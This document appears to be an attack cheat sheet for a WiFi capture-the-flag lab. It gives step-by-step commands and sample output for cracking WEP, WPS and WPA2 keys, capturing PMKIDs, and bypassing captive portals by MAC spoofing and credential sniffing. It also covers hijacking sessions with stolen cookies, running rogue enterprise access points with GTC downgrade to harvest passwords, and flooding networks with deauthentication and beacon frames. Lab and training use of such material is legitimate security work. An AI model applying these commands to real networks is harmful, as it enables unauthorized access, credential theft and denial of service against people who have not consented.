# WiFi Hacking Tree

> **Usage Guide:** This cheat sheet is ordered from initial setup to the final stage of exploitation. Each attack includes: **Prerequisites → Commands → Data Obtained → Next Step**.

---

## 🧰 Section Zero: Initial Setup and Full Reset

### 0.1. Full Environment Reset (Before Each Challenge)

```bash
# 1. Kill interfering processes
sudo systemctl stop NetworkManager
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo airmon-ng check kill

# 2. Delete all virtual monitor interfaces
for i in $(iw dev | grep Interface | awk '{print $2}'); do
    sudo iw dev $i del 2>/dev/null
done

# 3. Reset driver (in simulator environment)
sudo modprobe -r mac80211_hwsim && sleep 2 && sudo modprobe mac80211_hwsim

# 4. (Optional) Ready-made script
sudo ~/restartWiFi.sh
```

### 0.2. Identify Interfaces and Driver

```bash
iw dev                    # List interfaces
iw phy                    # List physical radios
iw phy phy0 info          # Capabilities of phy0

# Find card driver
readlink /sys/class/net/wlan0/device/driver
sudo ethtool -i wlan0
lsusb -t                  # For USB
lspci -k                  # For PCI
```

### 0.3. Create Monitor Mode (Manual Method — Most Reliable)

```bash
# airmon-ng method
sudo airmon-ng start wlan0

# Manual method (if airmon is broken)
sudo iw phy phy0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up
iw dev wlan0mon info      # Should show type monitor
```

> ⚠️ **Golden Note:** For `hcxdumptool` always use a **dedicated** monitor interface (on a separate `phy`), not `wlan0mon` which shares with `wlan0`.

### 0.4. Managing Managed Interfaces

```bash
# Disable/enable
sudo ip link set wlan1 down
sudo ip link set wlan1 up

# Change type to managed
sudo iw dev wlan1 set type managed

# Rename interface
sudo ip link set wlan0mon down
sudo ip link set wlan0mon name mymon
sudo ip link set mymon up
```

---

## 🔍 Section 1: Recon / Enumeration

### 1.1. Comprehensive Scan of All Bands

```bash
mkdir -p ~/wifi
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```

| Flag | Meaning |
|-----|---------|
| `--band abg` | Scan 2.4GHz (b/g) and 5GHz (a) — **without this, 5GHz networks won't appear** |
| `--wps` | Show WPS status |
| `--manufacturer` | Show manufacturer |
| `-w` | Save output (`.cap`, `.csv`, ...) |

### 1.2. Important Output Columns — APs (Top Table)

| Column | Meaning | Use |
|------|---------|-----|
| **BSSID** | AP MAC | Target identifier for filtering |
| **PWR** | Signal strength (closer to zero = stronger) | Choose nearby target |
| **CH** | Channel | **Critical** for locking card |
| **ENC** | Encryption type: `OPN`/`WEP`/`WPA2`/`WPA3` | Determine attack type |
| **CIPHER** | `CCMP` (strong), `TKIP` (weak), `WEP` | Target priority |
| **AUTH** | `PSK` / `MGT` / `SAE` / `OWE` | Determine strategy |
| **WPS** | `0.0` = disabled, `2.0` = enabled | WPS attack |
| **ESSID** | Network name (`<length: N>` = hidden) | Identification |

### 1.3. Important Output Columns — Clients (Bottom Table)

| Column | Meaning | Use |
|------|---------|-----|
| **BSSID** | Connected AP | Network detection |
| **STATION** | Client MAC | Deauth/Evil Twin target |
| **Probes** | Searched networks | **Golden** for Evil Twin |
| **Notes** | `PMKID` or `WPA handshake` | Capture success indicator |
| `(not associated)` | Not connected | Free client |

### 1.4. Extracting Information from CSV File

```bash
# Search for specific network
cat ~/wifi/scan-01.csv | grep "wifi-global"

# Sample output:
# F0:9F:C2:71:22:17, ..., 44, 54, WPA2, CCMP, MGT, -28, ..., wifi-global
# → BSSID = F0:9F:C2:71:22:17, CH = 44
```

### 1.5. Finding Probes with tshark

```bash
# Probe Request frames (subtype 4)
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq

# Filter specific client
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4 && wlan.sa == 78:c1:a7:bf:72:46" \
  -T fields -e wlan.ssid
```

### 1.6. Database Scans with wifi_db

```bash
sudo apt install sqlitebrowser -y
git clone https://github.com/r4ulcl/wifi_db.git
cd /root/tools/wifi_db
sudo python3 wifi_db.py -d /home/user/wifi/wifichallenge.SQLITE /home/user/wifi
sudo sqlitebrowser /home/user/wifi/wifichallenge.SQLITE
```

```sql
SELECT * FROM AP;
SELECT * FROM Client;
```

### 1.7. airodump-ng Output Files

| File | Use |
|------|-----|
| **`scan-01.cap`** | Main file — Wireshark/aircrack |
| `scan-01.csv` | Plain text — grep |
| `scan-01.kismet.csv` | Kismet output |
| `scan-01.kismet.netxml` | Kismet XML |
| `scan-01.log.csv` | Event log |

---

## 🌐 Section 2: Attacking OPN (Open) Networks

### 2.1. Connecting to Open Network (Simplest)

**Step 1: Create config**
```conf
# ~/wifi/open.conf
network={
    ssid="wifi-free"
    key_mgmt=NONE
    scan_ssid=1        # if network is hidden
}
```

**Step 2: Connect**
```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
```

**Step 3: Obtain IP**
```bash
sudo dhclient wlan2 -v
# Output: bound to 192.168.16.84 from 192.168.16.1
# → Gateway = 192.168.16.1
```

**Step 4: Identify Gateway**
```bash
ip route
# or
ip a show wlan2
```

**Step 5: Access Router Panel**
```bash
firefox http://192.168.16.1
# Try admin/admin, admin/password, admin/1234 ...
```

---

### 2.2. Bypassing Captive Portal with MAC Spoofing

**Strategy:** Login page decides based on MAC → spoof a valid client's MAC → enter without login.

**Step 1: Capture traffic + identify active client**
```bash
sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
# Frames column → highest = most active client (valid)
# Example: B0:72:BF:44:B0:49 with 232 frames
```

**Step 2: Initial connection to network**
```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
sudo dhclient wlan2 -v
```

**Step 3: Spoof MAC**

```bash
# Stop NetworkManager
sudo systemctl stop NetworkManager

# Bring interface down, change MAC, bring up
sudo ip link set wlan2 down
sudo macchanger -m b0:72:bf:44:b0:49 wlan2
sudo ip link set wlan2 up

# If wpa_supplicant gets stuck:
sudo pkill wpa_supplicant
sudo ip link set wlan2 down && sleep 2
sudo ip link set wlan2 up && sleep 2
```

**Step 4: Reconnect**
```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
sudo dhclient -v wlan2
```

**Step 5: Sniff HTTP to Extract Credentials**

```bash
# Wait 3-5 minutes for traffic to accumulate
sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
```

**Step 6: Analyze in Wireshark**
```bash
wireshark ~/wifi/scanc6-01.cap
# Filter: http.request.method == "POST"
# or: http contains "Password"
```

**Sample output:**
```
Form item: "Username" = "free1"
Form item: "Password" = "Jyl1iq8UajZ1fEK"
```

**Step 7: Login with stolen credentials**
```bash
firefox http://<gateway>
# username: free1, password: Jyl1iq8UajZ1fEK
```

---

## 🐌 Section 3: Attacking WEP

### 3.1. Theoretical Background — Why WEP is Broken

- WEP uses **RC4**.
- Each packet has **IV** (24-bit) + key = Keystream.
- IV is only 24-bit → ~16 million values → by collecting enough IVs (20-50k), the key can be broken with **FMS/PTW Attack**.
- `aircrack-ng` performs statistical analysis itself.

### 3.2. AUTO Method — `besside-ng` (Fastest)

**Step 1: Preparation**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan7
# Find BSSID and channel of wifi-old (e.g., CH=3)
```

**Step 2: Run automated attack**
```bash
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

> ⚠️ Note: `besside-ng` runs on the **Monitor Mode** interface (`wlan2` that you put into monitor), not `wlan0mon` created by airmon.

**What happens?**
1. Automatic Fake Auth
2. Association
3. ARP Replay
4. Collect 30,000+ IVs in ~4 minutes
5. Automatic cracking

**Step 3: Read key from log**
```
[02:35:38] Got key for wifi-old [11:bb:33:cd:55] 30044 IVs
[02:35:38] Pwned network wifi-old in 4:22 mins:sec
```
→ **KEY = `11:bb:33:cd:55`**

---

### 3.3. MANUAL Method — Step by Step

#### Step 1: Capture traffic from target

```bash
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 \
  -w ~/wifi/wifi-old wlan0mon
```

> `#Data` column = number of IVs collected. **Goal: 20,000 to 50,000**

#### Step 2: Fake Authentication (introduce yourself to AP)

```bash
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
```

| Flag | Meaning |
|-----|---------|
| `-1 3600` | Re-authenticate every 3600 seconds |
| `-q 10` | Keep-Alive every 10 seconds |
| `-a` | Target BSSID |

> **Why?** AP only talks to associated clients. WEP works with Open Auth, so no password needed.

#### Step 3: ARP Replay (generate artificial traffic)

```bash
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 \
  -h BA:49:A9:53:A1:8C wlan0mon
```

| Flag | Meaning |
|-----|---------|
| `--arpreplay` | Inject captured ARPs |
| `-b` | Target BSSID |
| `-h` | Your MAC (fake client) |

> **Why?** AP sends packets faster → more IVs generated.

#### Step 3.5 (Optional): Deauth to stimulate traffic

```bash
sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 \
  -c 64:32:A8:56:32:56 wlan0mon
```

#### Step 4: Crack the key

```bash
sudo aircrack-ng ~/wifi/wifi-old-01.cap
# Output: KEY FOUND! [ 11:bb:33:cd:55 ]
```

#### Step 5: Create WEP config and connect

```conf
# ~/wifi/wep.conf
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=11bb33cd55
    wep_tx_keyidx=0
}
```

```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf
sudo dhclient wlan2 -v
ip route
# Access router web server and retrieve flag
```

### 3.4. Supplementary WEP Attacks (Not in Writeup but Important)

| Attack | Command | Use |
|------|-------|-----|
| **Fragmentation** | `aireplay-ng -5 -b <BSSID> -h <MAC> wlan0mon` | Generate IVs without ARP |
| **ChopChop** | `aireplay-ng -4 -b <BSSID> -h <MAC> wlan0mon` | Crack packet without ARP |
| **KoreK** | `aircrack-ng -K capture.cap` | Old WEP cracking method |

---

## 🔑 Section 4: Attacking WPS

### 4.1. Why WPS is Dangerous

- 8-digit PIN is split into **two 4-digit halves**.
- AP checks each half separately → only **20,000** possibilities (not 100 million).
- Some APs are vulnerable to **Pixie Dust** (crack in seconds).

### 4.2. Identifying Active WPS

```bash
# Method 1: From airodump output (WPS column)
# Number other than 0.0 = WPS enabled

# Method 2: wash
sudo wash -i wlan0mon -c 8
```

**Sample output:**
```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
```
→ **WPS=2.0 (enabled), Lck=No (not locked) ✅**

> 🔒 If `Lck: Yes`: ignore with `-L` flag, try `bully`, or wait.

### 4.3. Method 1 — Pixie Dust (Fastest)

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
```

| Flag | Meaning |
|-----|---------|
| `-i` | Monitor interface |
| `-b` | Target BSSID |
| `-c` | Channel |
| `-vv` | verbose |
| `-K 1` | Pixie Dust mode |

### 4.4. Method 2 — PIN Brute-force (If Pixie Dust Fails)

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
```

| Flag | Meaning |
|-----|---------|
| `-S` | Small DH keys (faster) |
| `-N` | No NACK |
| `-L` | Ignore WPS lock |

**Successful output:**
```
WPS PIN: 12345670
WPA PSK: @MegaPSKP@ssword!@
AP SSID: wifi-event
```

### 4.5. Connect with Obtained Password

```conf
network={
    ssid="wifi-event"
    psk="@MegaPSKP@ssword!@"
}
```

```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/event.conf
sudo dhclient wlan2 -v
# → Access network and retrieve flag from router
```

---

## 🔐 Section 5: Attacking PSK (WPA2-Personal)

### 5.1. Capture 4-Way Handshake + Dictionary Attack

**Prerequisite:** A client connected to the network exists.

#### Step 1: Lock card on target channel

```bash
# Find channel from scan
sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan
# Assume: wifi-mobile on CH=6, BSSID=F0:9F:C2:71:22:12
```

> ⚠️ **Why lock?** `airodump-ng` without `-c` hops between channels and may miss the Handshake.

#### Step 2: Deauth to force reconnect

```bash
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT-MAC> wlan0mon
```

#### Step 3: Simultaneous capture

```bash
sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 \
  -w ~/wifi/scanc6
# When this line appears → success:
# [ WPA handshake: F0:9F:C2:71:22:12
```

#### Step 4: Dictionary Attack

```bash
aircrack-ng ~/wifi/scanc6-01.cap -w /root/rockyou-top100000.txt
# Output: KEY FOUND! [ starwars1 ]
```

#### Step 5: Connect and exploit

```conf
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/psk.conf
sudo dhclient wlan3 -v
ip a show wlan3
ip route | grep default
```

---

### 5.2. Decrypting WPA2 Traffic (Passive Decrypt)

**Step 1: Decrypt cap file**
```bash
airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap
# Output: ~/wifi/scanc6-01-dec.cap
```

| Flag | Meaning |
|-----|---------|
| `-e` | ESSID |
| `-p` | PSK password |

**Step 2: Analyze decrypted traffic**

```bash
wireshark ~/wifi/scanc6-01-dec.cap
# Filter: http
```

**Extract server IPs:**
```bash
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http" -T fields -e ip.dst | sort -u
# 192.168.2.1 (router)
# 192.168.2.8 (user server)
```

**Extract cookies:**
```bash
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" \
  -T fields -e ip.src -e ip.dst -e http.cookie
# 192.168.2.8  192.168.2.1  PHPSESSID=296228e3896440bd508d4c69e11e265c
```

**Extract Set-Cookie:**
```bash
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.set_cookie" \
  -T fields -e ip.src -e ip.dst -e http.set_cookie
```

---

### 5.3. Session Hijacking with Stolen Cookie

**Step 1: Connect to network** (with obtained password — step 5.1.5)

**Step 2: Use cookie to login**

```bash
# First test
curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
  http://192.168.2.1/

# If redirect occurs
curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
  http://192.168.2.1/
```

**Step 3: Extract flag**
```bash
curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
  http://192.168.2.1/ | grep -o 'flag{[^}]*}'
```

---

### 5.4. Checking Client Isolation

**Step 1: Connect to network** (step 5.1.5)

**Step 2: ARP scan**
```bash
sudo arp-scan -I wlan3 -l
```

**Sample output:**
```
192.168.2.1  f0:9f:c2:71:22:12  Ubiquiti Networks Inc.   # router
192.168.2.7  28:6c:07:6f:f9:43  XIAOMI Electronics       # user server
192.168.2.8  28:6c:07:6f:f9:44  XIAOMI Electronics       # yourself (maybe after MAC)
```

**Step 3: Access user server**
```bash
for ip in 192.168.2.7 192.168.2.9 192.168.2.10; do
    echo "=== $ip ==="
    curl -s -m 3 http://$ip/ | grep -o 'flag{[^}]*}'
done
```

> **Interpretation:** If `curl` to `192.168.2.7` succeeds → **Client Isolation is disabled** and you retrieved the flag. If timeout → enabled.

---

### 5.5. Rogue AP + Handshake from Probe (Hidden/Absent Network)

**Scenario:** `wifi-offices` network is not in range but clients send Probes.

#### Step 1: Identify Probes

```bash
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.ssid
# Observed: 78:c1:a7:bf:72:46 → wifi-offices
```

#### Step 2: Create Rogue AP with hostapd-mana

```conf
# ~/wifi/hostapd-mana.conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

| Parameter | Meaning |
|---------|---------|
| `interface=wlan1` | Managed interface (not monitor) |
| `ssid=wifi-offices` | Target network name |
| `mana_wpaout=hostapd.hccapx` | Handshake output file |
| `wpa_passphrase=12345678` | Fake AP password |

#### Step 3: Run and wait for client connection

```bash
sudo hostapd-mana ~/wifi/hostapd-mana.conf
# Wait for client Probe→Assoc→Handshake
# Message: AP-STA-POSSIBLE-PSK-MISMATCH (because password is wrong)
```

#### Step 4: Crack Handshake

```bash
# Direct method
hashcat -a 0 -m 2500 hostapd.hccapx /root/rockyou-top100000.txt --force

# If error → convert to 22000
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
hcxpcapngtool aux.pcap -o hash.22000
hashcat -a 0 -m 22000 hash.22000 /root/rockyou-top100000.txt --force

# Show result
hashcat -m 22000 hash.22000 --show
# 3d0695...:020000000100:78c1a7bf7246:wifi-offices:password1
```

→ **Password = `password1`**

#### Step 5: Connect and access

```conf
network={
    ssid="wifi-offices"
    psk="password1"
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/offices.conf
sudo dhclient wlan2 -v
```

---

### 5.6. PMKID Attack (Client-less — For Networks Without Clients)

**Scenario:** `wifi-campus` network without clients — cannot capture Handshake.

#### Step 1: Prepare dedicated interface

```bash
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo airmon-ng check kill
```

> ⚠️ **Important:** Do not use `wlan0mon` (on `phy#0` shared with `wlan0`; `hcxdumptool` gives `failed to arm interface` error).

```bash
# Create monitor interface on separate phy
sudo iw phy phy70 interface add wlan6mon type monitor
sudo ip link set wlan6mon up
sudo iw dev wlan6mon set channel 7
iw dev wlan6mon info
```

#### Step 2: Run hcxdumptool

```bash
sudo hcxdumptool -i wlan6mon -w campus.pcapng -c 7a --rds=2 -A
```

| Flag | Meaning |
|-----|---------|
| `-i wlan6mon` | Dedicated monitor interface |
| `-w campus.pcapng` | Output file |
| `-c 7a` | Channel 7, 2.4GHz band |
| `--rds=2` | Live display of APs/PMKID |
| `-A` | ACK frames |

**Successful output:**
```
CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID
  7|11:31:18|ep+  +|980EE416B9E3|f09fc2712231|wifi-campus
```

#### Step 3: Extract hash

```bash
hcxpcapngtool -o campus.22000 campus.pcapng
```

#### Step 4: Crack

```bash
hashcat -m 22000 -a 0 campus.22000 /root/rockyou-top100000.txt --force
# → basketball
```

#### Step 5: Connect

```conf
network={
    ssid="wifi-campus"
    psk="basketball"
    key_mgmt=WPA-PSK
    proto=RSN
    pairwise=CCMP
    scan_ssid=1
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/campus.conf
sudo dhclient wlan3 -v
# Access AP website and retrieve flag
```

---

## 🏢 Section 6: Attacking MGT (WPA2/WPA3-Enterprise)

### 6.1. Prerequisites

```bash
sudo apt update
sudo apt install -y eaphammer hostapd-wpe asleap hashcat john aircrack-ng
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer && sudo ./kali-setup
```

### 6.2. Identifying EAP Type (Recon)

#### Step 1: Scan network

```bash
sudo airodump-ng wlan0mon --band abg
# Find MGT network (e.g., wifi-corp-legacy, CH=44, BSSID=F0:9F:CB:3F:BC:27)
```

#### Step 2: Capture EAP traffic

```bash
sudo airodump-ng -c 44 --bssid F0:9F:CB:3F:BC:27 \
  -w ~/wifi/legacy wlan0mon
```

#### Step 3: Analyze with tshark

```bash
tshark -r ~/wifi/legacy-01.cap -Y "eap" -T fields \
  -E header=y -E separator='|' \
  -e frame.number -e wlan.sa -e wlan.da \
  -e eap.code -e eap.type -e eap.identity -e eap.md5.value
```

**EAP codes:**

| Code | EAP Type | Attack Method |
|----|---------|----------|
| 4 | EAP-MD5 | Sniff + offline crack (hashcat -m 4800) |
| 6 | EAP-GTC | Rogue AP + GTC Downgrade (plaintext) |
| 13 | EAP-TLS | Rogue AP + certificate theft |
| 21 | EAP-TTLS | Rogue AP + MSCHAPv2 (hashcat -m 5500) |
| 25 | PEAP | Rogue AP + MSCHAPv2 / GTC Downgrade |

---

### 6.3. EAP-MD5 Attack (Code 4) — Passive Sniffing

**Step 1: Capture** (done above)

**Step 2: Extract Challenge/Response**

```bash
tshark -r ~/wifi/legacy-01.cap -Y "eap.type == 4" \
  -T fields -e frame.number -e eap.id -e eap.code -e eap.md5.value
```

**Sample output:**
```
1338  219  1  9d36b0771289ff6cac0d87908e3c3e6f   # Challenge (server)
1339  219  2  7aa0513eabcf931d0b6b426857e6f573   # Response (client)
```

**Identity:**
```
1337  WORKGROUP\administrator
```

**Step 3: Convert to hashcat format**

```bash
hcxpcapngtool --eapmd5=legacy.hc4800 ~/wifi/legacy-01.cap
```

**Step 4: Crack**

```bash
hashcat -m 4800 -a 0 legacy.hc4800 /root/rockyou-top100000.txt
# Output: 7aa051...:9d36b...:db:pinkfloyd7
```

**Formula:** `Response = MD5(ID || Password || Challenge)`

**Step 5: Construct flag**

```
flag{WORKGROUP\administrator:pinkfloyd7}
```

---

### 6.4. PEAP / EAP-TTLS Attack — Rogue AP

**Scenario:** Clients connect to `wifi-corp-legacy` (MGT) and have certificates.

#### Step 1: Identify client and channel

```bash
sudo airodump-ng wlan0mon --band abg -w ~/wifi/legacy
# BSSID = F0:9F:CB:3F:BC:27, CH = 44, Client = 64:32:A8:AD:AB:53
```

#### Step 2: Deauth to force reconnect

```bash
sudo aireplay-ng --deauth 10 -a F0:9F:CB:3F:BC:27 \
  -c 64:32:A8:AD:AB:53 wlan0mon
```

#### Step 3: Generate fake certificate

```bash
cd ~/eaphammer
python3 eaphammer --cert-wizard
# → CA and Server certificates are created
```

#### Step 4: Launch Rogue AP

```bash
sudo python3 eaphammer -i wlan1 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp-legacy" \
  --creds \
  --autocrack \
  --wordlist /root/rockyou-top100000.txt
```

| Parameter | Meaning |
|---------|---------|
| `-i wlan1` | Managed interface |
| `--channel 44` | Target channel |
| `--auth wpa-eap` | WPA2-Enterprise |
| `--essid "..."` | Target network name |
| `--creds` | Collect credentials |
| `--autocrack` | Automatic MSCHAPv2 cracking |
| `--wordlist` | Wordlist |

#### Step 5: Successful output (MSCHAPv2)

```
[+] Captured EAP identity: WORKGROUP\administrator
[+] MSCHAPv2 challenge: aabbccdd...
[+] MSCHAPv2 response: 00112233...
```

**Manual crack (if no `--autocrack`):**
```bash
asleap -C <CHALLENGE> -R <RESPONSE> -W /root/rockyou-top100000.txt
```

**Or with hashcat:**
```bash
# Hash format: username::::response:challenge
hashcat -m 5500 hash.txt /root/rockyou-top100000.txt
```

#### Step 6: GTC Downgrade (if client rejects certificate)

```bash
sudo python3 eaphammer -i wlan1 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp-legacy" \
  --creds \
  --negotiate gtc-downgrade
```

→ Password appears in log as **plaintext**:
```
[+] EAP identity: WORKGROUP\administrator
[+] GTC Password: pinkfloyd7
```

---

### 6.5. EAP-TLS Attack (Code 13) — Rogue AP Accepting Any Certificate

**Scenario:** Mutual authentication with certificates — client certificate must be stolen.

#### Step 1: Compile hostapd-wpe

```bash
git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git
cd hostapd-wpe
# Download hostapd-2.6.tar.gz from https://w1.fi/releases/
tar -xzf hostapd-2.6.tar.gz
cd hostapd-2.6
patch -p1 < ../hostapd-wpe.patch
cd hostapd
make && sudo make install
```

#### Step 2: Modify code to accept any certificate

```
File: src/crypto/tls_openssl.c
Change: SSL_set_verify(ssl, SSL_VERIFY_PEER, ...) 
    →  SSL_set_verify(ssl, SSL_VERIFY_NONE, ...)
```
Then `make && make install` again.

#### Step 3: Config

```conf
# /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan1
ssid=wifi-corp-legacy
channel=44
driver=nl80211
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh
```

#### Step 4: Run

```bash
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
tail -f /var/log/hostapd-wpe.log
```

#### Step 5: Deauth and wait for client connection

```bash
sudo aireplay-ng --deauth 10 -a <BSSID_LEGIT> -c <CLIENT_MAC> wlan0mon
```

**Output:** Client certificate is saved in log.

---

### 6.6. EAP-GTC Attack — GTC Downgrade

```bash
sudo python3 eaphammer -i wlan1 \
  --channel <CH> \
  --auth wpa-eap \
  --essid "<SSID_TARGET>" \
  --creds \
  --negotiate gtc-downgrade
```

→ Plaintext password in terminal:
```
[+] EAP identity: CORP\jsmith
[+] GTC Password: MySecretPassword123!
```

---

### 6.7. MGT Attacks Summary Table

| EAP | Tool | Output | Hashcat |
|-----|-------|-------|---------|
| **MD5** | `eapmd5pass` or tshark | MD5-Challenge hash | `-m 4800` |
| **TLS** | `hostapd-wpe` | Client certificate | N/A |
| **TTLS** | `eaphammer` + `asleap` | MSCHAPv2 | `-m 5500` |
| **PEAP** | `eaphammer` | MSCHAPv2 | `-m 5500` |
| **GTC** | `eaphammer` | Plaintext | N/A |

---

## 🛡️ Section 7: WIDS and DoS (Not in Writeup)

### 7.1. Attacker Detection with Nzyme

```bash
# In WiFiChallenge Lab, Nzyme is ready on the VM
# Challenge 27: View alerts for attack detection (Deauth, Evil Twin)
```

### 7.2. DoS Attacks (Supplementary)

```bash
# Beacon Flood
sudo mdk4 wlan0mon b -n "FakeNet"

# Authentication Flood
sudo mdk4 wlan0mon a -a <BSSID>

# Deauth Flood
sudo mdk4 wlan0mon d -b <BSSID_FILE>

# Disassociation
sudo aireplay-ng --deauth 100 -a <BSSID> wlan0mon
```

---

## 📊 Section 8: Quick Decision — Which Attack for Which Network?

| ENC | AUTH | WPS | Client | Recommended Attack | Tool |
|-----|------|-----|--------|----------------|------|
| **OPN** | - | - | - | Simple connection | `wpa_supplicant` |
| **OPN** | Captive Portal | - | Yes | MAC Spoofing + HTTP Sniff | `macchanger` + `airodump-ng` |
| **WEP** | - | - | Yes | ARP Replay | `besside-ng` or `aireplay-ng` |
| **WPA2** | PSK | **2.0** | Any | **WPS first** | `reaver -K 1` |
| **WPA2** | PSK | 0.0 | Yes | Handshake + Dictionary | `airodump-ng` + `aircrack-ng` |
| **WPA2** | PSK | 0.0 | **No** | **PMKID Attack** | `hcxdumptool` |
| **WPA2** | PSK | 0.0 | Probe found | **Rogue AP** | `hostapd-mana` |
| **WPA2** | MGT | - | Yes | Rogue AP | `eaphammer` |
| **WPA3** | SAE | - | - | Wacker / Downgrade | `wacker` |
| **WPA3** | OWE | - | - | (limited) | - |

---

## 🎯 Section 9: Data Flow in Each Attack

### OPN + Captive Portal
```
Scan → BSSID+CH → Connect → DHCP → IP+GW
    → Capture → active client MAC
    → MAC Spoof → Capture again → HTTP POST → Credential
    → Login → Flag
```

### WEP
```
Scan → BSSID+CH → Capture traffic
    → Fake Auth → Assoc
    → ARP Replay → 30k IVs → aircrack → WEP key
    → Create wep.conf → Connect → IP → web server → Flag
```

### WPS
```
Scan → WPS=2.0 → wash → Pixie/PIN → PSK
    → Create config → Connect → IP → Flag
```

### PSK Handshake
```
Scan → BSSID+CH+Client → Capture + Deauth
    → Handshake in cap → aircrack + rockyou → PSK
    → Connect → airdecap-ng → decrypted traffic
    → Cookie → Session Hijack → Flag
    → or arp-scan → user server → Flag (no auth)
```

### PMKID
```
Scan → BSSID+CH → hcxdumptool (no client)
    → .pcapng → hcxpcapngtool → hash 22000
    → hashcat → PSK → Connect → Flag
```

### MGT
```
Scan → BSSID+CH → Capture EAP
    → tshark → eap.type → attack method
    ├─ MD5: hcxpcapngtool → hashcat -m 4800
    └─ PEAP/TTLS: eaphammer + Deauth → MSCHAPv2 → hashcat -m 5500
        → Credential → flag{DOMAIN\USER:PASS}
```

---

## 🧠 Section 10: Meanings of Flags and Common Options

### `airodump-ng`

| Flag | Meaning |
|-----|------|
| `-w` | Save with prefix |
| `-c` | Lock on channel |
| `--bssid` | Filter BSSID |
| `--band abg` | All bands |
| `--wps` | Show WPS |
| `--manufacturer` | Manufacturer |
| `--output-format` | Output format |

### `aireplay-ng`

| Flag | Meaning |
|-----|------|
| `-1 3600 -q 10` | Fake Auth |
| `--arpreplay` | ARP Replay |
| `-0 N` | Deauth N frames |
| `-5` | Fragmentation |
| `-4` | ChopChop |
| `-a` | BSSID |
| `-c` | Client MAC |
| `-h` | Source MAC |

### `aircrack-ng`

| Flag | Meaning |
|-----|------|
| `-w` | Wordlist |
| `-K` | KoreK attack |
| `-b` | BSSID |

### `hcxdumptool`

| Flag | Meaning |
|-----|------|
| `-i` | Dedicated monitor interface |
| `-w` | pcapng file |
| `-c` | Channel (`7a` = CH 7 band 2.4) |
| `--rds=2` | Live display |
| `-A` | ACK frames |
| `--disable_disassociation` | Prevent auto Deauth |

### `hashcat`

| Mode | Use |
|-----|------|
| `-m 22000` | WPA-PBKDF2-PMKID+EAPOL (new) |
| `-m 2500` | WPA-EAPOL-PBKDF2 (old) |
| `-m 4800` | EAP-MD5 |
| `-m 5500` | MSCHAPv2 |
| `-m 5600` | NetNTLMv2 |
| `-a 0` | Straight (dictionary) |

### `wpa_supplicant`

| Flag | Meaning |
|-----|------|
| `-Dnl80211` | Standard driver |
| `-i<iface>` | Interface |
| `-c<file>` | Config |

### `tshark` — Common WiFi Filters

| Filter | Use |
|-------|------|
| `eap` | All EAP frames |
